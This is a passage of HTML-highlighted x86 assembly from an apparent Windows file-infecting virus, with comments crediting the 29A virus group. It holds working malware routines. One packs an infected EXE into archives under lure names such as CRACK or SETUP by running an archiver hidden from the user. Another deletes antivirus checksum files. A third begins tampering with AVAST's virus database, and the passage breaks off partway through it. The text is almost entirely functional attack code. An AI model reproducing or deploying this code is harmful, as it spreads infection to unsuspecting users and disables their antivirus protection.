        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;end of name ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gCRC32_finish</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc5">__gCRC32_next_bit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__gCRC32_no_change</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">__mCRC32</span><span class="sc0">
    </span><span class="sc5">__gCRC32_no_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gCRC32_next_bit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gCRC32_next_byte</span><span class="sc0">
    </span><span class="sc5">__gCRC32_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;CRC32 to EAX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to add dropper to table ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is main feature for inside-archive works.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;What we know:</span><span class="sc0">
        </span><span class="sc1">;  * this function is called from "infect_file"</span><span class="sc0">
        </span><span class="sc1">;  * it's certainly *.EXE file</span><span class="sc0">
        </span><span class="sc1">;  * its filesize is lesser then 30Kb</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;Headlines:</span><span class="sc0">
        </span><span class="sc1">;  * get empty archive dropper (create ZIP/ARJ's dropper ?)</span><span class="sc0">
        </span><span class="sc1">;      * if CAB, no packing (stupid structure)</span><span class="sc0">
        </span><span class="sc1">;  * give me TEMP directory (e.g. \WINDOWS\TEMP)</span><span class="sc0">
        </span><span class="sc1">;  * create random TEMP file name (e.g. 29A + 0001.TMP, ...)</span><span class="sc0">
        </span><span class="sc1">;  * get random file name (e.g. SETUP, CRACK, GRATIS, ...)</span><span class="sc0">
        </span><span class="sc1">;  * copy infected file to TEMP directory under new name</span><span class="sc0">
        </span><span class="sc1">;  * create compress command</span><span class="sc0">
        </span><span class="sc1">;      (e.g. C:\ACE.EXE a -ep -m5 C;\TEMP\RUN.EXE C:\TEMP\29A0001.TMP)</span><span class="sc0">
        </span><span class="sc1">;  * create process and execute that command</span><span class="sc0">
        </span><span class="sc1">;  * check process' thread whether process has been finished</span><span class="sc0">
        </span><span class="sc1">;  * delete random file name</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:      EAX ... filesize</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__new_dName</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's newName</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__add_dropper</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; some free archiver program ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NewArchiveNum</span><span class="sc0">
    </span><span class="sc5">__ad_searching</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;convert &lt;1..NewArchiveNum&gt;</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  t o   &lt;0..NewArchiveNum-1&gt;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewArchive</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">NewArchiveSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; test whether dropper has been created</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ad_next</span><span class="sc0">

        </span><span class="sc1">; test whether CAB structure is empty</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NewArchiveNum</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ad_next_archive</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">   </span><span class="sc1">;allocate mem for CAB's name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.dropper</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;copy archive name EXE to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;my new CAB file name buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ad_next</span><span class="sc0">

        </span><span class="sc1">; test whether archiver program has been found</span><span class="sc0">
    </span><span class="sc5">__ad_next_archive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.program</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ad_next</span><span class="sc0">

        </span><span class="sc1">; time to prepare dropper - alloc mem, get temp filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.dropper</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get TEMP directory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;outta buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetTempPathA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;give me filepath length</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ad_dealloc</span><span class="sc0">

        </span><span class="sc1">; generate new filename for dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__new_dName</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_name</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; copy "filename_name" to "edi"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;rewrite its</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;new filepath and filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;actual filename</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCopyFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ad_dealloc_name</span><span class="sc0">

        </span><span class="sc1">; get TEMP file like destination archive name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.dropper</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ad_TEMP_three_chars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;the first three chars</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;main TEMP directory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetTempFileNameA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; delete TEMP file like archive name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddDeleteFileA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; get filname's last char from archiver</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ebx.program</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; get archiver's input parameters</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;convert to &lt;0..</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ArchiverCommandRealSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ArchiverCommand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ArchiverCommandSize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;copy input parameters</span><span class="sc0">

        </span><span class="sc1">; generate compression method</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;number of compression method</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;get compression method char</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;copy it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">;space letter</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@copysz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">    </span><span class="sc1">;space letter</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__new_dName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">@copysz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">;zero letter</span><span class="sc0">

        </span><span class="sc1">; get some startup information</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartupInfo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetStartupInfoA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.program</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ProcessInformation</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartupInfo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; set window's info</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.dwFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0"> </span><span class="sc1">;STARTF_USESHOWINDOW</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.wShowWindow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0"> </span><span class="sc1">;SW_HIDE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;CurrentDirectory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;Environment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">04000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \      </span><span class="sc1">;CREATE_PROCESS_ERROR_MODE</span><span class="sc0">
            </span><span class="sc2">00000200h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \      </span><span class="sc1">;CREATE_NEW_PROCESS_GROUP</span><span class="sc0">
            </span><span class="sc2">00000080h</span><span class="sc0">       </span><span class="sc1">;HIGH_PRIORITY_CLASS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;InheritHandles: FALSE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;ThreadAttributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;ProcessAttributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebx.program</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;Command</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;Application Name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateProcessA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;success ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__wait_to_comp</span><span class="sc0">

        </span><span class="sc1">; disable this achiver for future use</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.program</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.program</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ad_dealloc</span><span class="sc0">        </span><span class="sc1">;dealloc droper as well</span><span class="sc0">

        </span><span class="sc1">; give time to compressing</span><span class="sc0">
    </span><span class="sc5">__wait_to_comp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">        </span><span class="sc1">;4 seconds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ProcessInformation.hThread</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWaitForSingleObject</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; shut down that process</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;error-code</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ProcessInformation.hProcess</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddTerminateProcess</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__new_dName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;delete copied file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddDeleteFileA</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">__ad_dealloc_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__new_dName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;dealloc dropper's new name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">

    </span><span class="sc5">__ad_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ad_searching</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__ad_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ad_next</span><span class="sc0">

    </span><span class="sc5">__ad_TEMP_three_chars</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;greeting to all from this</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;excelent group (family)</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to delete AV files ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function has been called from Hyper Infection - API.</span><span class="sc0">
        </span><span class="sc1">;So, If any AV checksum file has been found, I will delete</span><span class="sc0">
        </span><span class="sc1">;its.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    EDX ... file name</span><span class="sc0">
</span><span class="sc5">kill_av</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddDeleteFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to change AVAST's viruses database ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function modify/truncate AVAST's viruses database.</span><span class="sc0">
        </span><span class="sc1">;If you want to read tutorial about this method, download</span><span class="sc0">
        </span><span class="sc1">;it from my web: http://prizzy.cjb.net</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    filename_ptr ... is filled</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ka_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;database's handle</span><span class="sc0">
        </span><span class="sc5">__ka_memory</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;database's body</span><span class="sc0">
        </span><span class="sc5">__ka_new_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;database's new size</span><span class="sc0">
        </span><span class="sc5">__ka_checksum</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;database's new chck</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">kill_avast</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; open AVAST's viruses database</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__ka_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ka_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; generate new database's file size</span><span class="sc0">
